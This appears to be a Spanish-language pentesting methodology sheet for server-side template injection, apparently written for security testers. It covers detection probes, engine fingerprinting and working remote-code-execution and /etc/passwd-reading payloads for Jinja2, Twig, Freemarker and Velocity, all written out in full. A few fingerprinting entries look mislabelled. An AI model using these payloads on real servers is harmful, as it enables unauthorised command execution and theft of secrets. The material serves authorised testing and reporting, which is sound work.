# SSTI — Server-Side Template Injection

## Señales de entrada
- Inputs de usuario reflejados en páginas generadas dinámicamente.
- Mensajes de error o notificaciones que incluyen el input.
- Funcionalidades de plantillas: emails personalizados, PDFs, reportes.
- Parámetros de nombre, descripción, asunto de email, firma.
- Tecnologías: Jinja2 (Python), Twig (PHP), Freemarker (Java), Pebble, Velocity, Smarty.

## Metodología

### Paso 1: detección
```
# Payload universal de detección
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}

# Si el output es 49 → SSTI confirmado
# Si es un error de template → también es señal
```

### Paso 2: identificar el motor de templates
```
{{7*'7'}}  →  7777777   = Jinja2 / Twig
{{7*'7'}}  →  49        = Smarty / otros
a{*comment*}b  →  sin error = Smarty
${{7*7}}   →  49        = Pebble / Spring
#{7*7}     →  49        = Ruby ERB
```

### Paso 3: explotación según motor

#### Jinja2 (Python)
```python
# RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Alternativa con subclasses
{{''.__class__.__mro__[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Lectura de ficheros
{{config.__class__.__init__.__globals__['open']('/etc/passwd').read()}}
```

#### Twig (PHP)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# O más simple
{{['id']|filter('system')}}
```

#### Freemarker (Java)
```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

#### Velocity (Java)
```java
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("exec","test".getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")
```

## Impacto alto
- RCE en el servidor → acceso completo al sistema.
- Lectura de ficheros sensibles (configs, claves, env vars).
- Exfiltración de variables de entorno con secrets.

## Falsos positivos
- Expresión reflejada como texto plano (no evaluada).
- Motor de templates con sandbox estricto (verificar si hay bypass).
- Error de template sin ejecución real.

## Evidencia mínima
- `{{7*7}}` → `49` en el output.
- Para RCE: output de `id` o `whoami` visible en respuesta.
- Request completo con payload + respuesta con resultado.
